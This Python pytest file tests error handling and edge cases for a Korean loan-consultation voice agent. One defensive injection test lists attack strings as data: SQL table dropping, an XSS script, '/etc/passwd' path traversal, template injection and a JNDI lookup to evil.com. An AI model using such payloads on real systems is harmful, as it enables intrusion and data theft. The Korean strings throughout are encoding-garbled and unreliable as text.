"""
Edge cases and error handling test scenarios for the ë””ë”¤ëŒ voice consultation agent.

This module contains comprehensive test scenarios for edge cases, error conditions,
and stress testing to ensure robust behavior under various failure modes.
"""

import pytest
from unittest.mock import Mock, AsyncMock, patch, MagicMock
import json
from typing import List, Dict, Any
from langchain_core.messages import HumanMessage, AIMessage

from app.graph.agent import (
    entry_point_node,
    main_agent_router_node,
    factual_answer_node,
    call_scenario_agent_node,
    process_scenario_logic_node,
    set_product_type_node,
    synthesize_response_node,
    prepare_direct_response_node,
    web_search_node
)
from app.graph.state import AgentState


class TestServiceFailureScenarios:
    """Test scenarios when external services fail."""
    
    @pytest.mark.asyncio
    async def test_rag_service_down(self):
        """Test behavior when RAG service is not available."""
        state = {
            "user_input_text": "ë””ë”¤ëŒ ëŒ€ì¶œ ê¸ˆë¦¬ê°€ ì–¼ë§ˆì¸ê°€ìš”?",
            "messages": [HumanMessage(content="ë””ë”¤ëŒ ëŒ€ì¶œ ê¸ˆë¦¬ê°€ ì–¼ë§ˆì¸ê°€ìš”?")],
            "stt_result": "ë””ë”¤ëŒ ëŒ€ì¶œ ê¸ˆë¦¬ê°€ ì–¼ë§ˆì¸ê°€ìš”?",
            "action_plan": ["invoke_qa_agent"],
            "action_plan_struct": [{"tool": "invoke_qa_agent"}]
        }
        
        # Mock RAG service as not ready
        with patch('app.graph.agent.rag_service') as mock_rag:
            mock_rag.is_ready.return_value = False
            
            result = await factual_answer_node(state)
            response = result["factual_response"]
            
            # Should provide graceful error message
            assert "ì •ë³´ ê²€ìƒ‰ ê¸°ëŠ¥ì— ë¬¸ì œê°€ ë°œìƒ" in response
            assert "ì ì‹œ í›„ ë‹¤ì‹œ" in response or "ë‹¤ë¥¸ ë°©ë²•" in response
            
            # Should use polite Korean
            assert any(marker in response for marker in ['ìŠµë‹ˆë‹¤', 'ì„¸ìš”', 'ì‹­ë‹ˆë‹¤', 'ìš”'])
    
    @pytest.mark.asyncio
    async def test_rag_service_error_during_query(self):
        """Test behavior when RAG service throws an error during query."""
        state = {
            "user_input_text": "ë””ë”¤ëŒ ëŒ€ì¶œ ì¡°ê±´ì´ ì–´ë–»ê²Œ ë˜ë‚˜ìš”?",
            "messages": [HumanMessage(content="ë””ë”¤ëŒ ëŒ€ì¶œ ì¡°ê±´ì´ ì–´ë–»ê²Œ ë˜ë‚˜ìš”?")],
            "stt_result": "ë””ë”¤ëŒ ëŒ€ì¶œ ì¡°ê±´ì´ ì–´ë–»ê²Œ ë˜ë‚˜ìš”?",
            "action_plan": ["invoke_qa_agent"],
            "action_plan_struct": [{"tool": "invoke_qa_agent"}]
        }
        
        # Mock RAG service to throw an error
        with patch('app.graph.agent.rag_service') as mock_rag, \
             patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
            
            mock_rag.is_ready.return_value = True
            mock_rag.answer_question = AsyncMock(side_effect=Exception("Database connection failed"))
            
            result = await factual_answer_node(state)
            response = result["factual_response"]
            
            # Should handle error gracefully
            assert "ì •ë³´ë¥¼ ê²€ìƒ‰í•˜ëŠ” ì¤‘ ì˜¤ë¥˜ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤" in response
            assert "ë‹¤ì‹œ ì‹œë„" in response or "ë¬¸ì˜" in response
    
    @pytest.mark.asyncio
    async def test_web_search_service_timeout(self):
        """Test behavior when web search service times out."""
        state = {
            "user_input_text": "ì˜¤ëŠ˜ ì£¼ì‹ ì‹œì¥ ë™í–¥ì´ ì–´ë–¤ê°€ìš”?",
            "messages": [HumanMessage(content="ì˜¤ëŠ˜ ì£¼ì‹ ì‹œì¥ ë™í–¥ì´ ì–´ë–¤ê°€ìš”?")],
            "stt_result": "ì˜¤ëŠ˜ ì£¼ì‹ ì‹œì¥ ë™í–¥ì´ ì–´ë–¤ê°€ìš”?",
            "action_plan": ["invoke_web_search"],
            "action_plan_struct": [{"tool": "invoke_web_search", "tool_input": {"query": "ì£¼ì‹ ì‹œì¥ ë™í–¥"}}]
        }
        
        # Mock web search service to timeout
        with patch('app.graph.agent.web_search_service') as mock_web:
            mock_web.asearch = AsyncMock(side_effect=TimeoutError("Request timeout"))
            
            result = await web_search_node(state)
            response = result["factual_response"]
            
            # Should handle timeout gracefully
            assert "ì›¹ ê²€ìƒ‰" in response and "ì˜¤ë¥˜" in response
            assert "ì‹œê°„ì´ ì´ˆê³¼" in response or "ë‹¤ì‹œ ì‹œë„" in response
    
    @pytest.mark.asyncio
    async def test_llm_service_unavailable(self):
        """Test behavior when LLM service is unavailable."""
        state = {
            "user_input_text": "ì•ˆë…•í•˜ì„¸ìš”",
            "messages": [HumanMessage(content="ì•ˆë…•í•˜ì„¸ìš”")],
            "stt_result": "ì•ˆë…•í•˜ì„¸ìš”",
            "main_agent_routing_decision": "answer_directly_chit_chat"
        }
        
        # Mock LLM to throw connection error
        with patch('app.graph.agent.generative_llm') as mock_llm, \
             patch('app.graph.agent.ALL_PROMPTS', {"main_agent": {"chitchat_prompt": "test"}}):
            
            mock_llm.ainvoke = AsyncMock(side_effect=Exception("LLM service unavailable"))
            
            result = await prepare_direct_response_node(state)
            response = result["final_response_text_for_tts"]
            
            # Should provide fallback response
            assert "ì£„ì†¡í•©ë‹ˆë‹¤" in response
            assert "ë¬¸ì œê°€ ë°œìƒ" in response or "ì¼ì‹œì " in response
    
    @pytest.mark.asyncio
    async def test_scenario_data_corruption(self):
        """Test behavior when scenario data is corrupted or missing."""
        state = {
            "user_input_text": "ë””ë”¤ëŒ ëŒ€ì¶œ ìƒë‹´ ë°›ê³  ì‹¶ì–´ìš”",
            "messages": [HumanMessage(content="ë””ë”¤ëŒ ëŒ€ì¶œ ìƒë‹´ ë°›ê³  ì‹¶ì–´ìš”")],
            "stt_result": "ë””ë”¤ëŒ ëŒ€ì¶œ ìƒë‹´ ë°›ê³  ì‹¶ì–´ìš”"
        }
        
        # Mock corrupted scenario data
        with patch('app.graph.agent.ALL_SCENARIOS_DATA', None), \
             patch('app.graph.agent.ALL_PROMPTS', None):
            
            result = await entry_point_node(state)
            
            # Should detect service failure
            assert result["error_message"] is not None
            assert "Service initialization failed" in result["error_message"]
            assert result["is_final_turn_response"] is True


class TestInputVariationScenarios:
    """Test scenarios with various input variations and edge cases."""
    
    @pytest.mark.asyncio
    async def test_very_long_input(self):
        """Test handling of extremely long user input."""
        # Create very long input (over 1000 characters)
        long_input = "ë””ë”¤ëŒ ëŒ€ì¶œì— ëŒ€í•´ì„œ " + "ì •ë§ ìì„¸íˆ " * 100 + "ì•Œê³  ì‹¶ì–´ìš”"
        
        state = {
            "user_input_text": long_input,
            "messages": [HumanMessage(content=long_input)],
            "stt_result": long_input,
            "action_plan": ["invoke_qa_agent"],
            "action_plan_struct": [{"tool": "invoke_qa_agent"}]
        }
        
        # Mock RAG service
        with patch('app.graph.agent.rag_service') as mock_rag, \
             patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
            
            mock_rag.is_ready.return_value = True
            mock_rag.answer_question = AsyncMock(return_value="ë””ë”¤ëŒ ëŒ€ì¶œ ì •ë³´ì…ë‹ˆë‹¤.")
            
            result = await factual_answer_node(state)
            response = result["factual_response"]
            
            # Should handle long input gracefully
            assert response is not None
            assert len(response) > 0
            assert "ë””ë”¤ëŒ" in response
    
    @pytest.mark.asyncio
    async def test_empty_or_whitespace_input(self):
        """Test handling of empty or whitespace-only input."""
        test_inputs = ["", "   ", "\n\n", "\t\t", "   \n  \t  "]
        
        for empty_input in test_inputs:
            state = {
                "user_input_text": empty_input,
                "messages": [HumanMessage(content=empty_input)],
                "stt_result": empty_input
            }
            
            with patch('app.graph.agent.ALL_SCENARIOS_DATA', {}), \
                 patch('app.graph.agent.ALL_PROMPTS', {}):
                
                result = await entry_point_node(state)
                
                # Should handle empty input gracefully
                assert result["stt_result"] == empty_input
                # Should not crash and should set appropriate state
    
    @pytest.mark.asyncio
    async def test_special_characters_input(self):
        """Test handling of input with special characters and symbols."""
        special_inputs = [
            "ë””ë”¤ëŒ ëŒ€ì¶œ #%@!?",
            "ê¸ˆë¦¬ëŠ”??? ì–¼ë§ˆì¸ê°€ìš”!!!",
            "ëŒ€ì¶œí•œë„ $$ ìµœëŒ€ ì–¼ë§ˆ?",
            "ì•ˆë…•í•˜ì„¸ìš” ^^; ìƒë‹´ë°›ê³ ì‹¶ì–´ìš” ã… ã… ",
            "ì „ì„¸ìê¸ˆëŒ€ì¶œ Î± Î² Î³ ì •ë³´ì£¼ì„¸ìš”"
        ]
        
        for special_input in special_inputs:
            state = {
                "user_input_text": special_input,
                "messages": [HumanMessage(content=special_input)],
                "stt_result": special_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}]
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value="ê´€ë ¨ ì •ë³´ì…ë‹ˆë‹¤.")
                
                result = await factual_answer_node(state)
                response = result["factual_response"]
                
                # Should handle special characters gracefully
                assert response is not None
                assert len(response) > 0
    
    @pytest.mark.asyncio
    async def test_mixed_language_input(self):
        """Test handling of mixed Korean-English input."""
        mixed_inputs = [
            "ë””ë”¤ëŒ loan ì •ë³´ ì•Œë ¤ì£¼ì„¸ìš”",
            "interest rateê°€ ì–´ë–»ê²Œ ë˜ë‚˜ìš”?",
            "Account opening í•˜ê³  ì‹¶ì–´ìš”",
            "Hello, ëŒ€ì¶œ ìƒë‹´ ë°›ê³  ì‹¶ìŠµë‹ˆë‹¤",
            "ì „ì„¸ìê¸ˆëŒ€ì¶œ information please"
        ]
        
        for mixed_input in mixed_inputs:
            state = {
                "user_input_text": mixed_input,
                "messages": [HumanMessage(content=mixed_input)],
                "stt_result": mixed_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}]
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value="ëŒ€ì¶œ ì •ë³´ë¥¼ ì•ˆë‚´í•´ ë“œë¦½ë‹ˆë‹¤.")
                
                result = await factual_answer_node(state)
                response = result["factual_response"]
                
                # Should handle mixed language gracefully
                assert response is not None
                assert "ëŒ€ì¶œ" in response or "ì •ë³´" in response
    
    @pytest.mark.asyncio
    async def test_numbers_and_currency_variations(self):
        """Test handling of various number and currency formats."""
        number_inputs = [
            "5ì²œë§Œì› ëŒ€ì¶œ ë°›ê³  ì‹¶ì–´ìš”",
            "50,000,000ì› í•œë„ ê°€ëŠ¥í•œê°€ìš”?",
            "ê¸ˆë¦¬ 2.5% ë§ë‚˜ìš”?",
            "ì—°ë´‰ì´ 4ì²œ5ë°±ë§Œì›ì¸ë°",
            "ë³´ì¦ê¸ˆ 2ì–µ 3ì²œë§Œì›ì´ì—ìš”",
            "í•œë„ê°€ 4000ë§Œì›ì¸ê°€ìš”?",
            "ì´ììœ¨ ì—° 3í”„ë¡œì •ë„?"
        ]
        
        for number_input in number_inputs:
            state = {
                "user_input_text": number_input,
                "messages": [HumanMessage(content=number_input)],
                "stt_result": number_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}]
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value="ê¸ˆì•¡ ê´€ë ¨ ì •ë³´ë¥¼ ì•ˆë‚´í•´ ë“œë¦½ë‹ˆë‹¤.")
                
                result = await factual_answer_node(state)
                response = result["factual_response"]
                
                # Should handle various number formats
                assert response is not None
                assert any(keyword in response for keyword in ["ê¸ˆì•¡", "ì›", "ëŒ€ì¶œ", "í•œë„", "ê¸ˆë¦¬"])


class TestConcurrencyAndPerformanceScenarios:
    """Test scenarios related to concurrent access and performance edge cases."""
    
    @pytest.mark.asyncio
    async def test_rapid_successive_requests(self):
        """Test handling of rapid successive requests from the same user."""
        rapid_inputs = [
            "ë””ë”¤ëŒ ëŒ€ì¶œ",
            "ê¸ˆë¦¬ëŠ”?",
            "í•œë„ëŠ”?",
            "ì¡°ê±´ì€?",
            "ì„œë¥˜ëŠ”?"
        ]
        
        # Simulate rapid requests
        for i, rapid_input in enumerate(rapid_inputs):
            state = {
                "user_input_text": rapid_input,
                "messages": [HumanMessage(content=rapid_input)],
                "stt_result": rapid_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}],
                "session_id": "rapid_test_session",
                "turn_id": i
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value=f"ì‘ë‹µ {i}: ê´€ë ¨ ì •ë³´ì…ë‹ˆë‹¤.")
                
                result = await factual_answer_node(state)
                response = result["factual_response"]
                
                # Should handle each request properly
                assert response is not None
                assert len(response) > 0
    
    @pytest.mark.asyncio
    async def test_memory_pressure_large_conversation(self):
        """Test behavior under memory pressure with large conversation history."""
        # Create large conversation history (100 turns)
        large_history = []
        for i in range(100):
            large_history.extend([
                HumanMessage(content=f"ì§ˆë¬¸ {i}: ë””ë”¤ëŒ ëŒ€ì¶œì— ëŒ€í•´ ì•Œë ¤ì£¼ì„¸ìš”"),
                AIMessage(content=f"ë‹µë³€ {i}: ë””ë”¤ëŒ ëŒ€ì¶œì€ ì²­ë…„ì¸µì„ ìœ„í•œ ëŒ€ì¶œì…ë‹ˆë‹¤.")
            ])
        
        state = {
            "user_input_text": "ë§ˆì§€ë§‰ ì§ˆë¬¸ì…ë‹ˆë‹¤. ì´ì •ë¦¬í•´ ì£¼ì„¸ìš”.",
            "messages": large_history + [HumanMessage(content="ë§ˆì§€ë§‰ ì§ˆë¬¸ì…ë‹ˆë‹¤. ì´ì •ë¦¬í•´ ì£¼ì„¸ìš”.")],
            "stt_result": "ë§ˆì§€ë§‰ ì§ˆë¬¸ì…ë‹ˆë‹¤. ì´ì •ë¦¬í•´ ì£¼ì„¸ìš”.",
            "action_plan": ["invoke_qa_agent"],
            "action_plan_struct": [{"tool": "invoke_qa_agent"}]
        }
        
        with patch('app.graph.agent.rag_service') as mock_rag, \
             patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
            
            mock_rag.is_ready.return_value = True
            mock_rag.answer_question = AsyncMock(return_value="ë””ë”¤ëŒ ëŒ€ì¶œ ì¢…í•© ì •ë³´ì…ë‹ˆë‹¤.")
            
            result = await factual_answer_node(state)
            response = result["factual_response"]
            
            # Should handle large conversation history
            assert response is not None
            assert "ë””ë”¤ëŒ" in response


class TestStateManagementEdgeCases:
    """Test edge cases in state management and conversation flow."""
    
    @pytest.mark.asyncio
    async def test_corrupted_state_recovery(self):
        """Test recovery from corrupted conversation state."""
        # Create state with missing required fields
        corrupted_state = {
            "user_input_text": "ëŒ€ì¶œ ì •ë³´ ì•Œë ¤ì£¼ì„¸ìš”",
            # Missing messages, stt_result, etc.
        }
        
        with patch('app.graph.agent.ALL_SCENARIOS_DATA', {"didimdol": {"scenario_name": "test"}}), \
             patch('app.graph.agent.ALL_PROMPTS', {"main_agent": {"test": "prompt"}}):
            
            result = await entry_point_node(corrupted_state)
            
            # Should handle missing fields gracefully
            assert result is not None
            assert "user_input_text" in result
    
    @pytest.mark.asyncio
    async def test_invalid_action_plan_handling(self):
        """Test handling of invalid action plans."""
        state = {
            "user_input_text": "ë””ë”¤ëŒ ëŒ€ì¶œ ì •ë³´",
            "messages": [HumanMessage(content="ë””ë”¤ëŒ ëŒ€ì¶œ ì •ë³´")],
            "stt_result": "ë””ë”¤ëŒ ëŒ€ì¶œ ì •ë³´",
            "action_plan": ["invalid_action", "unknown_tool"],
            "action_plan_struct": [{"tool": "invalid_action"}]
        }
        
        from app.graph.agent import execute_plan_router
        
        # Should route to default handler for unknown actions
        result = execute_plan_router(state)
        assert result == "prepare_direct_response_node"
    
    @pytest.mark.asyncio
    async def test_circular_routing_prevention(self):
        """Test prevention of infinite loops in routing."""
        state = {
            "user_input_text": "ë„ì›€ë§",
            "messages": [HumanMessage(content="ë„ì›€ë§")],
            "stt_result": "ë„ì›€ë§",
            "action_plan": [],  # Empty action plan
            "routing_history": ["main_agent_router", "execute_plan_router"] * 10  # Simulated loop
        }
        
        from app.graph.agent import execute_plan_router
        
        # Should break potential loops by routing to synthesis
        result = execute_plan_router(state)
        assert result == "synthesize_response_node"


class TestSecurityAndInputValidation:
    """Test security-related edge cases and input validation."""
    
    @pytest.mark.asyncio
    async def test_potential_injection_attempts(self):
        """Test handling of potential injection-style inputs."""
        injection_attempts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com}",
            "{% for item in range(1000) %}test{% endfor %}"
        ]
        
        for injection_input in injection_attempts:
            state = {
                "user_input_text": injection_input,
                "messages": [HumanMessage(content=injection_input)],
                "stt_result": injection_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}]
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value="ì•ˆì „í•œ ì‘ë‹µì…ë‹ˆë‹¤.")
                
                result = await factual_answer_node(state)
                response = result["factual_response"]
                
                # Should handle potentially malicious input safely
                assert response is not None
                assert "error" not in response.lower() or "ì•ˆì „" in response
                # Should not echo back the exact malicious input
                assert injection_input not in response
    
    @pytest.mark.asyncio
    async def test_unicode_and_encoding_edge_cases(self):
        """Test handling of various Unicode and encoding edge cases."""
        unicode_inputs = [
            "ëŒ€ì¶œ ì •ë³´ ğŸ ğŸ’°",  # Emojis
            "ë””ë”¤ëŒ ëŒ€ì¶œ Â® â„¢ Â©",  # Special symbols
            "ê¸ˆë¦¬ëŠ” Â½ % ì¸ê°€ìš”?",  # Fractions
            "í•œë„ê°€ âˆ ì¸ê°€ìš”?",  # Mathematical symbols
            "ìƒë‹´ ì‹œê°„ â†’ ì–¸ì œì¸ê°€ìš”?",  # Arrows
            "ëŒ€ì¶œ ì¡°ê±´ âœ“ âœ—",  # Check marks
            "\u200bë””ë”¤ëŒ\u200bëŒ€ì¶œ",  # Zero-width spaces
            "ëŒ€ì¶œ\u0000ì •ë³´",  # Null character
            "ì •ë³´\uffffì£¼ì„¸ìš”"  # Invalid Unicode
        ]
        
        for unicode_input in unicode_inputs:
            state = {
                "user_input_text": unicode_input,
                "messages": [HumanMessage(content=unicode_input)],
                "stt_result": unicode_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}]
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value="ëŒ€ì¶œ ì •ë³´ë¥¼ ì•ˆë‚´í•´ ë“œë¦½ë‹ˆë‹¤.")
                
                try:
                    result = await factual_answer_node(state)
                    response = result["factual_response"]
                    
                    # Should handle Unicode gracefully
                    assert response is not None
                    assert len(response) > 0
                except UnicodeError:
                    # Acceptable to fail on invalid Unicode, but should not crash the system
                    pass


class TestResourceLimitScenarios:
    """Test scenarios that push against resource limits."""
    
    @pytest.mark.asyncio
    async def test_maximum_message_history_length(self):
        """Test behavior at maximum conversation history length."""
        # Create conversation with maximum reasonable length
        max_history = []
        for i in range(1000):  # Very long conversation
            max_history.append(HumanMessage(content=f"ì§ˆë¬¸ {i}"))
            max_history.append(AIMessage(content=f"ë‹µë³€ {i}"))
        
        state = {
            "user_input_text": "ìš”ì•½í•´ ì£¼ì„¸ìš”",
            "messages": max_history + [HumanMessage(content="ìš”ì•½í•´ ì£¼ì„¸ìš”")],
            "stt_result": "ìš”ì•½í•´ ì£¼ì„¸ìš”",
            "action_plan": ["invoke_qa_agent"],
            "action_plan_struct": [{"tool": "invoke_qa_agent"}]
        }
        
        with patch('app.graph.agent.rag_service') as mock_rag, \
             patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
            
            mock_rag.is_ready.return_value = True
            mock_rag.answer_question = AsyncMock(return_value="ëŒ€í™” ìš”ì•½ì…ë‹ˆë‹¤.")
            
            result = await factual_answer_node(state)
            response = result["factual_response"]
            
            # Should handle very long history (may truncate if needed)
            assert response is not None
            assert len(response) > 0
    
    @pytest.mark.asyncio
    async def test_network_timeout_recovery(self):
        """Test recovery from network timeouts."""
        state = {
            "user_input_text": "í˜„ì¬ ë¶€ë™ì‚° ì‹œì¥ ë™í–¥ì€?",
            "messages": [HumanMessage(content="í˜„ì¬ ë¶€ë™ì‚° ì‹œì¥ ë™í–¥ì€?")],
            "stt_result": "í˜„ì¬ ë¶€ë™ì‚° ì‹œì¥ ë™í–¥ì€?",
            "action_plan": ["invoke_web_search"],
            "action_plan_struct": [{"tool": "invoke_web_search", "tool_input": {"query": "ë¶€ë™ì‚° ì‹œì¥"}}]
        }
        
        # Mock network timeout
        with patch('app.graph.agent.web_search_service') as mock_web:
            mock_web.asearch = AsyncMock(side_effect=TimeoutError("Network timeout"))
            
            result = await web_search_node(state)
            response = result["factual_response"]
            
            # Should provide graceful fallback
            assert "ë„¤íŠ¸ì›Œí¬" in response or "ì—°ê²°" in response or "ì‹œê°„" in response
            assert "ë‹¤ì‹œ ì‹œë„" in response or "ì ì‹œ í›„" in response


class TestDataValidationScenarios:
    """Test data validation and sanitization edge cases."""
    
    @pytest.mark.asyncio
    async def test_malformed_json_in_llm_response(self):
        """Test handling of malformed JSON responses from LLM."""
        state = {
            "user_input_text": "ë””ë”¤ëŒ ëŒ€ì¶œ ì •ë³´",
            "messages": [HumanMessage(content="ë””ë”¤ëŒ ëŒ€ì¶œ ì •ë³´")],
            "stt_result": "ë””ë”¤ëŒ ëŒ€ì¶œ ì •ë³´"
        }
        
        # Mock LLM to return malformed JSON
        with patch('app.graph.agent.json_llm') as mock_llm, \
             patch('app.graph.agent.ALL_PROMPTS', {"main_agent": {"test": "prompt"}}), \
             patch('app.graph.agent.initial_task_decision_parser') as mock_parser:
            
            mock_response = Mock()
            mock_response.content = '{"actions": [{"tool": "set_product_type", "tool_input": {'  # Malformed JSON
            mock_llm.ainvoke = AsyncMock(return_value=mock_response)
            
            # Mock parser to handle parsing error
            mock_parser.parse.side_effect = Exception("JSON parsing error")
            mock_parser.get_format_instructions.return_value = "format instructions"
            
            result = await main_agent_router_node(state)
            
            # Should handle malformed JSON gracefully
            assert result["error_message"] is not None
            assert result["main_agent_routing_decision"] == "unclear_input"
    
    @pytest.mark.asyncio
    async def test_unexpected_llm_response_format(self):
        """Test handling of unexpected LLM response formats."""
        state = {
            "user_input_text": "ì•ˆë…•í•˜ì„¸ìš”",
            "messages": [HumanMessage(content="ì•ˆë…•í•˜ì„¸ìš”")],
            "stt_result": "ì•ˆë…•í•˜ì„¸ìš”"
        }
        
        # Mock LLM to return unexpected format
        with patch('app.graph.agent.generative_llm') as mock_llm, \
             patch('app.graph.agent.ALL_PROMPTS', {"main_agent": {"chitchat_prompt": "test"}}):
            
            mock_response = Mock()
            mock_response.content = None  # Unexpected None content
            mock_llm.ainvoke = AsyncMock(return_value=mock_response)
            
            result = await prepare_direct_response_node(state)
            response = result["final_response_text_for_tts"]
            
            # Should provide fallback response
            assert response is not None
            assert len(response) > 0
            assert "ì•ˆë…•í•˜ì„¸ìš”" in response or "ë„ì›€" in response